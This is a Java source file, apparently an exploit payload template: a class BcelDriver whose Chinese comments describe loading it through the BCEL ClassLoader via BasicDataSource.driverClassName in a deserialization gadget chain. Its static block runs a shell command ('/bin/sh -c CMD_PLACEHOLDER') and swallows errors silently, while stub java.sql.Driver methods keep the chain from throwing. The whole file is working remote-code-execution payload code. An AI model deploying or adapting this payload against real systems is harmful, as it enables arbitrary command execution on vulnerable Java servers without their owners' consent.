import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.util.Properties;
import java.util.logging.Logger;

/**
 * BCEL 本地链模板：BasicDataSource.driverClassName 触发
 * com.sun.org.apache.bcel.internal.util.ClassLoader 定义本类，static 块执行命令。
 * 实现 java.sql.Driver 以保证后续 newInstance/转换不抛异常。
 */
public class BcelDriver implements Driver {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "CMD_PLACEHOLDER"});
        } catch (Exception e) {
            // 静默失败
        }
    }

    @Override
    public boolean acceptsURL(String url) {
        return false;
    }

    @Override
    public Connection connect(String url, Properties info) throws SQLException {
        return null;
    }

    @Override
    public int getMajorVersion() {
        return 0;
    }

    @Override
    public int getMinorVersion() {
        return 0;
    }

    @Override
    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info) {
        return new DriverPropertyInfo[0];
    }

    @Override
    public boolean jdbcCompliant() {
        return false;
    }

    @Override
    public Logger getParentLogger() {
        return Logger.getGlobal();
    }
}
